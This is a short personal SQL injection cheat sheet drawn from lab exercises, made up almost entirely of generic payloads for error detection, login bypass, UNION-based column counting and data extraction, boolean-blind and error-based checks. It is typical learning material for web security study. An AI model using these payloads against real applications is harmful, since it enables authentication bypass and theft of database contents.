# 🔥 SQL Injection Cheat Sheet (By Divine)

A fast, practical SQLi reference based on real labs and hands-on experience.

---

## 1️⃣ Detecting SQL Injection  
**Payloads to check for errors:**

' '' " ")
'))

**Expected responses:**
- SQL error  
- Broken page  
- Debug message  

If yes → parameter is vulnerable.

---

## 2️⃣ Authentication Bypass Payloads

' OR 1=1 -- '-- " OR 1=1 -- admin'-- admin' OR '1'='1

---

## 3️⃣ UNION‑Based SQL Injection  

### Determine number of columns:

' ORDER BY 1-- ' ORDER BY 2-- ' ORDER BY 3--

When it errors → previous number was the correct column count.

### Find column count using NULLs:

' UNION SELECT NULL-- ' UNION SELECT NULL, NULL-- ' UNION SELECT NULL, NULL, NULL--

---

## 4️⃣ Extracting Data with UNION  

### Example: extract database user

' UNION SELECT USER(), NULL--

### Example: extract table names

' UNION SELECT table_name, NULL FROM information_schema.tables--

### Oracle version (from your own lab):

' UNION SELECT banner, NULL FROM v$version--

---

## 5️⃣ Boolean‑Based SQL Injection

' AND 1=1 -- ' AND 1=2 --

Used to confirm blind SQLi when no errors show.

---

## 6️⃣ Comments to Break Queries

--



/* */

Common usage:

username'--

---

## 7️⃣ Useful Error‑Based Payloads

' AND (SELECT 1/0)-- ' AND (SELECT name FROM users WHERE ROWNUM = 1)--

---

## 8️⃣ UNION Attack Checklist  

✔ Number of columns determined  
✔ Identify which columns are text/integer  
✔ Inject payload using UNION  
✔ Extract version, user, tables, schema  
✔ Extract specific data  

---

## 🧠 Key Takeaways  
- Always test using `'` first  
- Comments (`--`) make SQLi powerful  
- UNION requires exact column match  
- Blind SQLi uses boolean conditions  
- Error messages reveal database type  

---

**This cheat sheet will grow as I advance.**
